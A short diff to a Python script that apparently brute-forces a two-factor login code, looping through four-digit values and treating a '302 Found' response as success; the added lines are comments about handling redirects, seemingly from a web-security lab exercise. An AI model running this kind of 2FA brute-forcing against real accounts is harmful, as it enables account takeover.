@@ -2,6 +2,7 @@ import requests
 from requests_toolbelt.utils import dump
 import sys
 
+# 2fa_broken_logic_v1 is 'better' version because of fix (not allowing redirections)
 
 url = ''
 session_key = ''
@@ -39,6 +40,7 @@ for i in range(1000):
     sys.stdout.write('\r'+str('{0:04}'.format(i)))
     sys.stdout.flush()
 # i was able to get 2fa code this way, not sure why in v1 using r.status_code or r.is_redirect or r.is_permanent_redirect did not confirm 302
+# fixed in v1, request returns status code from url user is redirected to
 
     if 'HTTP/1.1 302 Found' in dump.dump_all(r).decode('utf-8'):
         print(f' 2fa code is = {i}')
